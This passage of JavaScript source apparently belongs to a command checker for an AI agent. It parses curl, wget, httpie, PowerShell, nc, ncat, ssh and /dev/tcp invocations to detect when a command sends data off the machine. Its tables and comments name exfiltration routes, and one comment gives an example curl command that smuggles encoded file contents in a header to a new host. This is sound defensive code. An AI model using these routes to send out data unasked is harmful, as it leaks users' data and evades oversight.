    'proxy-tlsuser': 'data', 'proxy-tlspassword': 'data', 'login-options': 'data', 'sasl-authzid': 'data', cert: 'data',
    'proxy-cert': 'data', config: 'config', url: 'url', request: 'method', header: 'header', 'proxy-header': 'header',
    'user-agent': 'sent', referer: 'sent', range: 'sent', 'continue-at': 'sent', 'time-cond': 'sent', 'request-target': 'sent',
    'ftp-port': 'sent', 'ftp-account': 'sent', 'ftp-alternative-to-user': 'sent', 'telnet-option': 'sent', 'haproxy-clientip': 'sent',
    resolve: 'route', 'connect-to': 'route', proxy: 'route', preproxy: 'route', socks4: 'route', socks4a: 'route', socks5: 'route',
    'socks5-hostname': 'route', 'dns-servers': 'route', 'doh-url': 'route', 'ipfs-gateway': 'route',
    'unix-socket': 'socket', 'abstract-unix-socket': 'socket', output: 'save',
    ...localKinds(
      'output-dir dump-header cookie-jar stderr trace trace-ascii trace-config etag-save etag-compare libcurl write-out ' +
      'max-time connect-timeout speed-time speed-limit retry retry-delay retry-max-time max-redirs max-filesize limit-rate rate ' +
      'parallel-max cacert capath crlfile cert-type key key-type pass pinnedpubkey interface local-port keepalive-time ' +
      'keepalive-cnt expect100-timeout happy-eyeballs-timeout-ms create-file-mode tls-max ciphers tls13-ciphers curves proto ' +
      'proto-default proto-redir hsts alt-svc ssl-sessions dns-interface dns-ipv4-addr dns-ipv6-addr random-file egd-file engine ' +
      'proxy-cacert proxy-capath proxy-crlfile proxy-key proxy-key-type proxy-pass proxy-ciphers proxy-tls13-ciphers ' +
      'proxy-pinnedpubkey proxy-cert-type proxy-tlsauthtype tlsauthtype ftp-ssl-ccc-mode ftp-method tftp-blksize ip-tos ' +
      'vlan-priority sigalgs krb delegation service-name proxy-service-name socks5-gssapi-service help noproxy hostpubmd5 ' +
      'hostpubsha256 pubkey knownhosts ech',
    ),
  },
  // --expand-data, --expand-url and the like: that option's value with curl's variables put in.
  longPrefix: { 'expand-': 'data' },
};

const WGET_OPTIONS = {
  short: { a: 'local', A: 'local', B: 'sent', D: 'local', e: 'wgetrc', i: 'urls', I: 'local', l: 'local', o: 'local', O: 'save', P: 'local', Q: 'local', R: 'local', t: 'local', T: 'local', U: 'sent', w: 'local', X: 'local', Y: 'local' },
  flags: { spider: 'head' },
  long: {
    'post-data': 'data', 'post-file': 'data', 'body-data': 'data', 'body-file': 'data', user: 'data', password: 'data',
    'http-user': 'data', 'http-password': 'data', 'ftp-user': 'data', 'ftp-password': 'data', 'proxy-user': 'data',
    'proxy-password': 'data', 'load-cookies': 'data', certificate: 'data', method: 'method', execute: 'wgetrc', config: 'config',
    'input-file': 'urls', header: 'header', referer: 'sent', 'user-agent': 'sent', base: 'sent', 'output-document': 'save',
    ...localKinds(
      'output-file append-output directory-prefix tries timeout dns-timeout connect-timeout read-timeout wait ' +
      'waitretry quota limit-rate save-cookies ca-certificate ca-directory private-key private-key-type certificate-type ' +
      'bind-address progress level accept reject domains exclude-domains include-directories exclude-directories default-page ' +
      'local-encoding remote-encoding restrict-file-names warc-file secure-protocol cut-dirs max-redirect retry-on-http-error ' +
      'report-speed prefer-family accept-regex reject-regex regex-type crl-file egd-file random-file hsts-file ciphers ' +
      'pinnedpubkey bind-dns-address',
    ),
  },
  abbreviate: true,
  nPrefix: true,
};

const HTTPIE_OPTIONS = {
  short: { a: 'data', A: 'local', o: 'save', p: 'local', P: 'local', s: 'local' },
  flags: { I: 'nostdin', d: 'download', 'ignore-stdin': 'nostdin', https: 'https', download: 'download' },
  long: {
    auth: 'data', bearer: 'data', session: 'data', 'session-read-only': 'data', raw: 'data', cert: 'data',
    proxy: 'route', resolve: 'route', output: 'save',
    ...localKinds(
      'auth-type print pretty style format-options verify cert-key cert-key-pass ssl ciphers timeout max-redirects ' +
      'max-headers boundary default-scheme response-charset response-mime history-print http-version interface generate',
    ),
  },
  abbreviate: true,
  dashDash: true,
};

const ARIA2C_OPTIONS = {
  short: { d: 'local', i: 'urls', j: 'local', k: 'local', l: 'local', M: 'data', o: 'save', s: 'local', S: 'local', t: 'local', T: 'data', U: 'sent', x: 'local' },
  long: {
    'http-user': 'data', 'http-passwd': 'data', 'ftp-user': 'data', 'ftp-passwd': 'data', 'load-cookies': 'data',
    'torrent-file': 'data', 'metalink-file': 'data', 'input-file': 'urls', header: 'header', referer: 'sent', 'user-agent': 'sent',
    'all-proxy': 'route', 'http-proxy': 'route', 'https-proxy': 'route', 'ftp-proxy': 'route',
    out: 'save',
    ...localKinds('dir log max-connection-per-server split timeout connect-timeout max-tries retry-wait save-cookies'),
  },
};

/** nc and netcat as macOS and OpenBSD ship them, and Nmap's ncat. */
const NC_OPTIONS = {
  short: { b: 'local', e: 'local', I: 'local', i: 'local', K: 'local', M: 'local', m: 'local', O: 'local', P: 'data', p: 'local', R: 'local', s: 'local', T: 'local', V: 'local', w: 'local', X: 'local', x: 'route', Z: 'local', H: 'local' },
  flags: { l: 'listen', z: 'scan', U: 'socket' },
  long: {},
};
const NCAT_OPTIONS = {
  short: { c: 'sent', e: 'sent', g: 'local', G: 'local', i: 'local', m: 'local', p: 'local', s: 'local', w: 'local', x: 'local', d: 'local' },
  flags: { l: 'listen', z: 'scan', U: 'socket', listen: 'listen', unixsock: 'socket' },
  long: {
    exec: 'sent', 'sh-exec': 'sent', 'lua-exec': 'sent', proxy: 'route', 'proxy-type': 'local', 'proxy-auth': 'data',
    ...localKinds('source source-port wait idle-timeout delay max-conns output hex-dump append-output allow allowfile deny denyfile ssl-cert ssl-key ssl-trustfile ssl-ciphers ssl-alpn'),
  },
};
const TELNET_OPTIONS = { short: { b: 'local', e: 'local', k: 'local', l: 'data', n: 'local', S: 'local', s: 'local', X: 'local' }, long: {} };
const SSH_OPTIONS = { short: { B: 'local', b: 'local', c: 'local', D: 'local', E: 'local', e: 'local', F: 'local', I: 'local', i: 'local', J: 'route', L: 'local', l: 'local', m: 'local', O: 'local', o: 'local', P: 'local', p: 'local', Q: 'local', R: 'local', S: 'local', W: 'local', w: 'local' }, long: {} };
const SFTP_OPTIONS = { short: { B: 'local', b: 'local', c: 'local', D: 'local', F: 'local', i: 'local', J: 'route', l: 'local', o: 'local', P: 'local', R: 'local', S: 'local', s: 'local', X: 'local' }, long: {} };

/** PowerShell's Invoke-WebRequest and Invoke-RestMethod (iwr, irm): each parameter that takes a value. */
const POWERSHELL_WEB_PARAMS = {
  uri: 'url', method: 'method', custommethod: 'method', body: 'data', infile: 'data', form: 'data', token: 'data',
  credential: 'data', certificate: 'data', certificatethumbprint: 'data', websession: 'data', proxycredential: 'data',
  headers: 'header', contenttype: 'sent', useragent: 'sent', transferencoding: 'sent', authentication: 'sent', proxy: 'route',
  outfile: 'save',
  ...localKinds(
    'timeoutsec sessionvariable maximumredirection maximumretrycount retryintervalsec sslprotocol httpversion ' +
    'connectiontimeoutseconds operationtimeoutseconds responseheaderstvariable statuscodevariable erroraction warningaction ' +
    'informationaction errorvariable warningvariable informationvariable outvariable outbuffer pipelinevariable progressaction',
  ),
};
const POWERSHELL_WEB_SWITCHES = [
  'usebasicparsing', 'skipcertificatecheck', 'passthru', 'resume', 'disablekeepalive', 'noproxy', 'preserveauthorizationonredirect',
  'allowunencryptedauthentication', 'skipheadervalidation', 'skiphttperrorcheck', 'usedefaultcredentials',
  'proxyusedefaultcredentials', 'allowinsecureredirect', 'preservehttpmethodonredirect', 'followrellink', 'verbose', 'debug',
  'whatif', 'confirm',
];
const POWERSHELL_WEB = new Set(['invoke-webrequest', 'iwr', 'invoke-restmethod', 'irm']);

/** What a long option is in a client's table: {kind, flag}, a unique start where the client allows one. */
function longOption(table, given) {
  const flags = table.flags || {};
  if (Object.hasOwn(table.long, given) || Object.hasOwn(flags, given)) return { kind: table.long[given] || null, flag: flags[given] || null };
  for (const [prefix, kind] of Object.entries(table.longPrefix || {})) if (given.startsWith(prefix)) return { kind, flag: null };
  if (!table.abbreviate || given.length < 2) return { kind: null, flag: null };
  const names = [...Object.keys(table.long), ...Object.keys(flags).filter((n) => n.length > 1)].filter((n) => n.startsWith(given));
  if (names.length === 1) return { kind: table.long[names[0]] || null, flag: flags[names[0]] || null };
  // A start several options share: the client refuses it; if any of them sends data, it is data.
  const kinds = names.map((n) => table.long[n]).filter(Boolean);
  return { kind: kinds.find((k) => DATA_KINDS.has(k)) || kinds[0] || null, flag: null };
}

/**
 * Reads a network client's words with its table: {values: [{kind, value, dynamic}], positional:
 * [{word, dynamic}], flags}. An option named only when the command runs ("-$X") sets the flag
 * 'data': it could be any option.
 */
function readOptions(args, dynamic, table) {
  const values = [];
  const positional = [];
  const flags = new Set();
  const takeValue = (kind, k) => values.push({ kind, value: args[k + 1], dynamic: Boolean(dynamic[k + 1]) });
  for (let k = 0; k < args.length; k += 1) {
    const a = String(args[k] ?? '');
    const dyn = Boolean(dynamic[k]);
    if (a === '--' && table.dashDash) {
      for (let j = k + 1; j < args.length; j += 1) positional.push({ word: String(args[j] ?? ''), dynamic: Boolean(dynamic[j]) });
      break;
    }
    if (a.length > 2 && a.startsWith('--')) {
      const eq = a.indexOf('=');
      const given = a.slice(2, eq === -1 ? undefined : eq);
      if (dyn && /[$`]/.test(given)) flags.add('data');
      const { kind, flag } = longOption(table, given);
      if (flag) flags.add(flag);
      if (!kind) continue;
      if (eq !== -1) values.push({ kind, value: a.slice(eq + 1), dynamic: dyn });
      else {
        takeValue(kind, k);
        k += 1;
      }
      continue;
    }
    if (a.length > 1 && a.startsWith('-')) {
      for (let i = 1; i < a.length; i += 1) {
        const c = a[i];
        if (c === '$' || c === '`') {
          flags.add('data');
          break;
        }
        if (table.nPrefix && c === 'n') {
          i += 1;
          continue;
        }
        if (table.flags?.[c]) flags.add(table.flags[c]);
        const kind = table.short[c];
        if (!kind) continue;
        if (i + 1 < a.length) values.push({ kind, value: a.slice(i + 1), dynamic: dyn });
        else {
          takeValue(kind, k);
          k += 1;
        }
        break;
      }
      continue;
    }
    positional.push({ word: a, dynamic: dyn });
  }
  return { values, positional, flags };
}

function newRequest() {
  return { method: 'GET', carries: null, targets: [], unknown: false, routed: false, socket: false, saves: [], remoteNames: false };
}

/** Notes the first reason a request carries data. */
function carry(req, why) {
  if (!req.carries) req.carries = why;
}

function addTarget(req, word, dynamic, scheme = 'http') {
  const t = webTarget(word, { dynamic, scheme });
  req.targets.push(t);
  if (t.unknown) carry(req, 'goes to an address named only when it runs');
  else if (urlCarriesData(word, { dynamic })) carry(req, 'its address carries data');
}

/** One option's value, by what the client's table says it is. */
function noteOptionValue(req, { kind, value, dynamic }) {
  const v = String(value ?? '');
  if (kind === 'save') {
    req.saves.push({ value: v, dynamic });
    return;
  }
  if (kind === 'local') return;
  if (kind === 'data') return carry(req, 'sends data');
  if (kind === 'config' || kind === 'urls' || (kind === 'url' && v.startsWith('@'))) {
    req.unknown = true;
    return carry(req, kind === 'config' ? 'reads its options from a file' : 'reads its addresses from a file');
  }
  if (kind === 'url') return addTarget(req, v, dynamic);
  if (kind === 'method') {
    if (dynamic) return carry(req, 'uses a method named only when it runs');
    req.method = v.toUpperCase();
    return;
  }
  if (kind === 'socket') {
    req.socket = true;
    return;
  }
  if (kind === 'route') req.routed = true;
  if (dynamic) return carry(req, 'sends a value built when it runs');
  if (kind === 'header' && v.startsWith('@')) return carry(req, 'sends headers read from a file');
  if (redactSecrets(v) !== v) return carry(req, 'sends a secret');
  if ((kind === 'header' || kind === 'sent') && valueCarriesData(v)) carry(req, 'sends data in a header');
}

/**
 * True when a header or another value a request sends as written carries data by itself (review of
 * wk/connectors-flow, 28 Oct): a run of 48 or more letters, digits and + / = _ -, raw or decoded,
 * as in an address (urlCarriesData). A literal header on a plain GET could otherwise carry whatever
 * the agent read to a new host unasked: "curl -H 'X-D: <a file, encoded>' https://new.example".
 * Short values (Accept: application/json, a user agent, a date) stay a read.
 */
function valueCarriesData(value) {
  const v = String(value ?? '');
  return DATA_RUN.test(v) || DATA_RUN.test(decodedPart(v));
}

function finishRequest(req) {
  if (!READING_METHODS.has(req.method)) carry(req, `uses the ${req.method} method`);
  if (req.socket) for (const t of req.targets) t.local = true;
  return req;
}

/** wget -e and --execute: one .wgetrc setting. Those that send data or sign in count (ADR-0146). */
const WGETRC_SENDS = new Set([
  'postdata', 'postfile', 'bodydata', 'bodyfile', 'header', 'user', 'password', 'httpuser', 'httppassword', 'httppasswd',
  'ftpuser', 'ftppassword', 'ftppasswd', 'proxyuser', 'proxypassword', 'proxypasswd', 'loadcookies', 'certificate',
  'useaskpass', 'askpassword',
]);
function noteWgetSetting(req, { value, dynamic }) {
  const v = String(value ?? '');
  if (dynamic) return carry(req, 'sends a value built when it runs');
  const eq = v.indexOf('=');
  const name = (eq === -1 ? v : v.slice(0, eq)).trim().toLowerCase().replace(/[-_]/g, '');
  const setting = eq === -1 ? '' : v.slice(eq + 1).trim().toUpperCase();
  if (name === 'method') {
    if (!READING_METHODS.has(setting)) carry(req, 'sends data');
    return;
  }
  if (name === 'input') {
    req.unknown = true;
    return carry(req, 'reads its addresses from a file');
  }
  if (/proxy$/.test(name)) req.routed = true;
  if (WGETRC_SENDS.has(name)) carry(req, 'sends data');
}

function curlRequest(args, dynamic) {
  const req = newRequest();
  const { values, positional, flags } = readOptions(args, dynamic, CURL_OPTIONS);
  if (flags.has('head')) req.method = 'HEAD';
  for (const v of values) noteOptionValue(req, v);
  for (const p of positional) addTarget(req, p.word, p.dynamic);
  if (flags.has('data')) carry(req, 'sends a saved sign-in or an option named only when it runs');
  if (flags.has('remotename')) req.remoteNames = true;
  return finishRequest(req);
}

function wgetRequest(args, dynamic) {
  const req = newRequest();
  const { values, positional, flags } = readOptions(args, dynamic, WGET_OPTIONS);
  if (flags.has('head')) req.method = 'HEAD';
  for (const v of values) {
    if (v.kind === 'wgetrc') noteWgetSetting(req, v);
    else noteOptionValue(req, v);
  }
  for (const p of positional) addTarget(req, p.word, p.dynamic);
  if (flags.has('data')) carry(req, 'uses an option named only when it runs');
  if (!flags.has('head') && !req.saves.length) req.remoteNames = true;
  return finishRequest(req);
}

function aria2cRequest(args, dynamic) {
  const req = newRequest();
  const { values, positional, flags } = readOptions(args, dynamic, ARIA2C_OPTIONS);
  for (const v of values) noteOptionValue(req, v);
  for (const p of positional) addTarget(req, p.word, p.dynamic);
  if (flags.has('data')) carry(req, 'uses an option named only when it runs');
  if (!req.saves.length) req.remoteNames = true;
  return finishRequest(req);
}

const HTTP_METHOD_WORDS = new Set(['GET', 'HEAD', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'TRACE', 'CONNECT']);

/** What an httpie or xh request item is: a header, a part of the address (name==value), or data. */
function requestItem(word) {
  const w = String(word ?? '');
  for (let i = 0; i < w.length; i += 1) {
    const c = w[i];
    if (c === '\\') {
      i += 1;
      continue;
    }
    if (c === ':') return w[i + 1] === '=' ? { kind: 'data' } : { kind: 'header', value: w.slice(i + 1) };
    if (c === '=') return w[i + 1] === '=' ? { kind: 'query', value: `${w.slice(0, i)}=${w.slice(i + 2)}` } : { kind: 'data' };
    if (c === '@') return { kind: 'data' };
    if (c === ';') return { kind: 'header', value: '' };
  }
  return { kind: 'data' };
}

/** httpie (http, https) and xh: [METHOD] URL [ITEM...]; input from a pipe or a file is sent as the body. */
function httpieRequest(prog, args, dynamic, fed) {
  const req = newRequest();
  const { values, positional, flags } = readOptions(args, dynamic, HTTPIE_OPTIONS);
  for (const v of values) noteOptionValue(req, v);
  if (flags.has('data')) carry(req, 'uses an option named only when it runs');
  const words = [...positional];
  let explicit = null;
  if (words.length > 1 && !words[0].dynamic && /^[A-Za-z]+$/.test(words[0].word) && (HTTP_METHOD_WORDS.has(words[0].word.toUpperCase()) || /^[A-Z]+$/.test(words[0].word))) {
    explicit = words.shift().word.toUpperCase();
  }
  const url = words.shift();
  if (url) addTarget(req, url.word, url.dynamic, prog === 'https' || flags.has('https') ? 'https' : 'http');
  for (const item of words) {
    const it = requestItem(item.word);
    if (it.kind === 'data') carry(req, 'sends data');
    else if (it.kind === 'query') {
      if (item.dynamic || urlCarriesData(`http://localhost/?${it.value}`)) carry(req, 'its address carries data');
    } else if (item.dynamic || it.value.startsWith('@') || redactSecrets(item.word) !== item.word) carry(req, 'sends a header built when it runs, read from a file or holding a secret');
    else if (valueCarriesData(item.word)) carry(req, 'sends data in a header');
  }
  if (fed && !flags.has('nostdin')) carry(req, 'sends its input');
  if (flags.has('download') && !req.saves.length) req.remoteNames = true;
  req.method = explicit || (req.carries ? 'POST' : 'GET');
  return finishRequest(req);
}

/** A PowerShell parameter of Invoke-WebRequest: {kind} or {isSwitch}, from its name or a unique start. */
function powershellWebParam(given) {
  if (Object.hasOwn(POWERSHELL_WEB_PARAMS, given)) return { kind: POWERSHELL_WEB_PARAMS[given] };
  if (POWERSHELL_WEB_SWITCHES.includes(given)) return { isSwitch: true };
  const params = Object.keys(POWERSHELL_WEB_PARAMS).filter((p) => p.startsWith(given));
  const switches = POWERSHELL_WEB_SWITCHES.filter((s) => s.startsWith(given));
  if (params.length + switches.length === 1) return params.length ? { kind: POWERSHELL_WEB_PARAMS[params[0]] } : { isSwitch: true };
  // A start several parameters share, or none: PowerShell refuses it. If any of them sends data, it is data.
  if (params.some((p) => DATA_KINDS.has(POWERSHELL_WEB_PARAMS[p]))) return { kind: 'data' };
  if (!params.length && switches.length) return { isSwitch: true };
  return { kind: 'sent' };
}

/** True for a word that is one of Invoke-WebRequest's own parameters, written out in full. */
function isPowershellWebParam(word) {
  const m = /^-([A-Za-z]+)(:|$)/.exec(String(word ?? ''));
  const name = m?.[1].toLowerCase();
  return Boolean(name) && (Object.hasOwn(POWERSHELL_WEB_PARAMS, name) || POWERSHELL_WEB_SWITCHES.includes(name));
}

/** Invoke-WebRequest and Invoke-RestMethod: -Uri or the first word is the address; piped input is the body. */
function powershellRequest(args, dynamic, fed) {
  const req = newRequest();
  for (let k = 0; k < args.length; k += 1) {
    const a = String(args[k] ?? '');
    const dyn = Boolean(dynamic[k]);
    const m = /^-([A-Za-z]+)(?::(.*))?$/s.exec(a);
    if (m) {
      const param = powershellWebParam(m[1].toLowerCase());
      if (param.isSwitch) continue;
      if (m[2] !== undefined) noteOptionValue(req, { kind: param.kind, value: m[2], dynamic: dyn });
      else {
        noteOptionValue(req, { kind: param.kind, value: args[k + 1], dynamic: Boolean(dynamic[k + 1]) });
        k += 1;
      }
      continue;
    }
    addTarget(req, a, dyn);
  }
  if (fed) carry(req, 'sends its input');
  return finishRequest(req);
}

/**
 * Whether a web request carries data, and where it goes (ADR-0146). The rule, written once: a
 * request carries data when its method is not GET or HEAD; when it sends data, a file, its input,
 * cookies, a sign-in or options read from a file (curl -d, --data*, --json, -F, --form*, -T,
 * --url-query, -K, -b, -u, --variable and the like; wget --post-*, --body-*, --method, -e settings
 * that send, -i; httpie and xh data items, --raw, input from a pipe or a file; PowerShell -Body,
 * -InFile, -Form, -Method); when a word of it is built when the command runs ($VAR, $(...),
 * backticks), except a value that stays on this computer (where the answer is saved, a time limit);
 * when a header holds a secret or is read from a file; or when its address carries data
 * (urlCarriesData).
 * @param {string} prog  curl, wget, http, https, httpie, xh, aria2c, invoke-webrequest, iwr, invoke-restmethod, irm
 * @param {string[]} args  the words after the program
 * @param {{dynamic?: boolean[], fed?: boolean, powershell?: boolean}} [opts]  dynamic: per word, built
 *   when the command runs; fed: its input comes from a pipe or a file; powershell: read in PowerShell.
 * @returns {{carries: string|null, method: string, targets: Array<{host: string|null, unknown: boolean, local: boolean}>, unknown: boolean, routed: boolean, saves: Array<{value: string, dynamic: boolean}>, remoteNames: boolean}}
 *   carries: why it carries data, or null; targets: the addresses it names; unknown: it also goes to
 *   addresses read from a file; routed: another computer in between or other name lookups; saves:
 *   the files its answer is saved to; remoteNames: it saves under names taken from the addresses.
 */
export function dataLeaves(prog, args, { dynamic = [], fed = false, powershell = false } = {}) {
  const p = baseName(prog);
  const words = (Array.isArray(args) ? args : []).map((a) => String(a ?? ''));
  const dyn = words.map((_, k) => Boolean(dynamic[k]));
  // In Windows PowerShell 5.1, curl and wget are Invoke-WebRequest: read as one when its parameters show.
  if (POWERSHELL_WEB.has(p) || (powershell && (p === 'curl' || p === 'wget') && words.some(isPowershellWebParam))) return powershellRequest(words, dyn, fed);
  if (p === 'curl') return curlRequest(words, dyn);
  if (p === 'wget') return wgetRequest(words, dyn);
  if (p === 'aria2c') return aria2cRequest(words, dyn);
  if (['http', 'https', 'httpie', 'xh'].includes(p)) return httpieRequest(p, words, dyn, fed);
  // A client this file does not read: where it goes is unknown, so it is taken to carry data.
  return { ...newRequest(), carries: 'a client Aimiru does not read', unknown: true };
}

/**
 * The class of a web request no stronger class holds (ADR-0146). One that carries data is share,
 * with its host remembered, unless every address it names is this computer (then other, as
 * before). A plain read is read, its host remembered for net.get. One that names no address it
 * can read stays other, as before.
 */
function webRequestClass(out, req) {
  const away = req.targets.filter((t) => !t.local);
  if (req.carries) {
    if (req.targets.length && !away.length && !req.unknown && !req.routed) return 'other';
    const hosts = [...new Set(away.map((t) => t.host))];
    const named = !req.unknown && !req.routed && hosts.length === 1 && hosts[0] && !away.some((t) => t.unknown) ? hosts[0] : null;
    sharesWith(out, named, { unknown: !named && (req.unknown || req.routed || !away.length || away.some((t) => t.unknown || !t.host)) });
    return 'share';
  }
  const hosts = req.targets.map((t) => t.host).filter(Boolean);
  if (!hosts.length) return 'other';
  out.webReads.push(...hosts);
  return 'read';
}

/**
 * One step that sends data off this computer (ADR-0146): class share, and the host it goes to
 * (null when Aimiru cannot name one). When where it goes is not known (built when it runs, read
 * from a file), it is held when Aimiru cannot be asked.
 */
function sharesWith(out, host, { unknown = false, why = null } = {}) {
  out.classes.push('share');
  out.shareTo.push(host || null);
  if (unknown) {
    out.sensitive = true;
    out.why.push('sends to an address Aimiru cannot see before it runs');
  }
  if (why) out.why.push(why);
}

/** The host in a remote copy or sign-in address: user@host:path, host::module, scp://user@host:22/x. */
function remoteHostOf(word, dynamic = false) {
  const w = String(word ?? '').trim();
  if (/^[a-z][a-z0-9+.-]*:\/\//i.test(w)) return webTarget(w, { dynamic });
  const m = /^(?:[^@/]*@)?(\[[^\]]*\]|[^:/@]*)/.exec(w);
  const host = (m?.[1] || '').replace(/^\[(.*)\]$/, '$1').toLowerCase();
  if (dynamic && /[$`]/.test(m?.[0] || w)) return { host: null, unknown: true, local: false };
  return { host: host || null, unknown: false, local: isLoopbackHost(host) };
}

/**
 * nc, ncat, netcat and telnet with a host and not listening send what they are given to that host;
 * ssh does too when its input comes from a pipe, a file or the command line, or its command is
 * built when it runs (ADR-0146). {host, unknown, local}, or null when nothing leaves this way.
 */
function connectionOf(prog, args, argDyn, seg) {
  if (['nc', 'netcat', 'ncat', 'telnet'].includes(prog)) {
    const table = prog === 'ncat' ? NCAT_OPTIONS : prog === 'telnet' ? TELNET_OPTIONS : NC_OPTIONS;
    const { positional, flags } = readOptions(args, argDyn, table);
    if (flags.has('listen') || flags.has('scan') || flags.has('socket') || !positional.length) return null;
    return remoteHostOf(positional[0].word, positional[0].dynamic);
  }
  if (prog === 'ssh') {
    const { positional } = readOptions(args, argDyn, SSH_OPTIONS);
    const [dest, ...command] = positional;
    if (!dest) return null;
    const fed = inputRedirected(seg) || Boolean(stdinText(seg));
    if (!fed && !command.some((c) => c.dynamic)) return null;
    return sshMayGoElsewhere(prog, args, argDyn) ? { host: null, unknown: true, local: false } : remoteHostOf(dest.word, dest.dynamic);
  }
  return null;
}

/** ssh's -o settings that only tune a connection to the host it names; any other may send it elsewhere. */
const SSH_TUNING_SETTINGS = new Set(['port', 'user', 'stricthostkeychecking', 'userknownhostsfile', 'globalknownhostsfile', 'identityfile', 'identitiesonly', 'batchmode', 'connecttimeout', 'connectionattempts', 'serveraliveinterval', 'serveralivecountmax', 'tcpkeepalive', 'loglevel', 'compression', 'passwordauthentication', 'pubkeyauthentication', 'kbdinteractiveauthentication', 'preferredauthentications', 'checkhostip', 'hashknownhosts', 'nohostauthenticationforlocalhost', 'updatehostkeys', 'hostkeyalgorithms', 'addressfamily']);

/** The short options of ssh, scp and sftp that take a value (OpenSSH 10). */
const SSH_VALUE_LETTERS = { ssh: 'BbcDEeFIiJLlmOoPpQRSWw', scp: 'cDFiJloPSX', sftp: 'BbcDFiJloPRSsX' };

/**
 * True when an option can send ssh (scp, sftp, rsync's remote shell) to another computer than the
 * host it names (security review, 28 Oct): an -o setting that does more than tune the connection
 * (HostName, ProxyJump, ProxyCommand, CanonicalDomains, ControlPath ...) or one built when it runs,
 * a jump host (-J), another ssh settings file (-F), another ssh program or a shared connection (-S),
 * ssh's forwarding of its input (-W), or rsync's own ssh command (-e, --rsh).
 */
function sshMayGoElsewhere(prog, args, argDyn) {
  const letters = SSH_VALUE_LETTERS[prog] ?? '';
  for (let k = 0; k < args.length; k += 1) {
    const a = String(args[k] ?? '');
    if (a === '--') break;
    if (prog === 'rsync') {
      if (a === '--rsh' || a.startsWith('--rsh=') || (!a.startsWith('--') && /^-[A-Za-z0-9]*e/.test(a))) return true;
      continue;
    }
    if (!/^-[A-Za-z0-9]/.test(a)) continue;
    for (let i = 1; i < a.length; i += 1) {
      const c = a[i];
      if (c === 'J' || c === 'F' || c === 'S' || (c === 'W' && prog === 'ssh')) return true;
      if (!letters.includes(c)) continue;
      // This option takes the rest of the word, or the next word, as its value.
      const glued = a.slice(i + 1);
      if (c === 'o') {
        const value = glued || String(args[k + 1] ?? '');
        const name = (/^\s*([A-Za-z]+)/.exec(value)?.[1] ?? '').toLowerCase();
        if ((glued ? argDyn[k] : argDyn[k + 1]) || !SSH_TUNING_SETTINGS.has(name)) return true;
      }
      if (!glued) k += 1;
      break;
    }
  }
  return false;
}

/** bash's /dev/tcp/HOST/PORT and /dev/udp/HOST/PORT: {host, unknown, local}, or null for any other path. */
function devNetTarget(target, dynamic = false) {
  const m = /^\/dev\/(?:tcp|udp)\/([^/]+)\/[^/]+$/.exec(String(target ?? ''));
  if (!m) return null;
  if (dynamic && /[$`]/.test(m[1])) return { host: null, unknown: true, local: false };
  const host = m[1].toLowerCase();
  return { host, unknown: false, local: isLoopbackHost(host) };
}

/** One wrapper flag: its name, and its value (from the same word, or `next` when it is the next word). */
function readFlag(flag, spec) {
  if (flag.startsWith('--')) {
    const eq = flag.indexOf('=');
    const given = flag.slice(2, eq === -1 ? undefined : eq);
    const r = resolveLong(given, [...spec.long, ...(spec.longBool || [])]);
    const name = r.name ?? given;
    if (r.ambiguous) return { name, next: false, value: null, ambiguous: true };
    if (eq !== -1) return { name, next: false, value: flag.slice(eq + 1) };
    return { name, next: spec.long.includes(name), value: null };
  }
  for (let k = 1; k < flag.length; k += 1) {
    if (spec.short.includes(flag[k])) {
      const rest = flag.slice(k + 1);
      return rest ? { name: flag[k], next: false, value: rest } : { name: flag[k], next: true, value: null };
    }
  }
  return { name: null, next: false, value: null };
}

/**
 * Removes what runs the real program without being it: variable assignments, sudo, env, nohup,
 * time, exec, command, builtin, xargs, timeout and the like, with their flags and flag values.
 * env -S "prog args" is split into the program's words. With xargs -I, the words holding the
 * replacement text are only known when it runs.
 */
function stripWrappers(seg) {
  let toks = seg.words.map((w, k) => ({ w, dyn: Boolean(seg.dynamic?.[k]), exp: Boolean(seg.expand?.[k]), q: Boolean(seg.quoted?.[k]), sub: seg.subst?.[k] || [] }));
  let elevated = false;
  let viaXargs = false;
  const assignments = [];
  for (let guard = 0; toks.length; guard += 1) {
    const head = toks[0];
    if (guard >= 256) {
      // More wrappers than any real command uses: what finally runs is not read.
      head.dyn = true;
      break;
    }
    if (ASSIGNMENT_RE.test(head.w)) {
      assignments.push(toks.shift());
      continue;
    }
    if (head.dyn || head.exp) break; // a program named at run time: see classifySegment
    const b = baseName(head.w);
    if (b === 'timeout' || b === 'gtimeout') {
      toks.shift();
      while (toks.length && toks[0].w.startsWith('-')) {
        const f = toks.shift();
        if (f.w === '--') break;
        if (readFlag(f.w, WRAPPER_FLAGS.timeout).next) toks.shift();
      }
      toks.shift(); // the duration
      continue;
    }
    if (!WRAPPERS.has(b) && b !== 'xargs') break;
    if (b === 'sudo' || b === 'doas') elevated = true;
    if (b === 'xargs') viaXargs = true;
    toks.shift();
    const spec = WRAPPER_FLAGS[b] || NO_FLAGS;
    let replace = null;
    while (toks.length && (toks[0].w.startsWith('-') || ASSIGNMENT_RE.test(toks[0].w))) {
      const f = toks.shift();
      if (!f.w.startsWith('-')) {
        assignments.push(f);
        continue;
      }
      if (f.w === '--') break;
      if (b === 'command' && /^-[a-zA-Z]*[vV]/.test(f.w)) {
        toks = []; // command -v name: looks the program up, does not run it
        break;
      }
      const r = readFlag(f.w, spec);
      if (r.ambiguous) {
        // A wrapper option Aimiru cannot place: what runs after it is unknown.
        if (toks.length) toks[0].dyn = true;
        break;
      }
      let value = r.value;
      let valueDyn = f.dyn;
      if (r.next && toks.length) {
        const v = toks.shift();
        value = v.w;
        valueDyn = v.dyn;
      }
      if (b === 'env' && (r.name === 'S' || r.name === 'split-string') && value != null) {
        const inner = lexShell(value).segments.flatMap((s) => s.words.map((w, k) => ({ w, dyn: valueDyn || s.dynamic[k], exp: s.expand[k], sub: s.subst[k] })));
        toks = [...inner, ...toks];
      }
      if (b === 'xargs') {
        if (r.name === 'I' && value != null) replace = value;
        else if (/^-i/.test(f.w)) replace = f.w.slice(2) || '{}';
        else if (/^--replace(=|$)/.test(f.w)) replace = f.w.slice('--replace='.length) || '{}';
      }
    }
    if (replace) for (const t of toks) if (t.w.includes(replace)) t.dyn = true;
  }
  return {
    words: toks.map((t) => t.w),
    dynamic: toks.map((t) => t.dyn),
    expand: toks.map((t) => t.exp),
    quoted: toks.map((t) => t.q),
    subst: toks.map((t) => t.sub || []),
    elevated,
    viaXargs,
    assignments,
  };
}

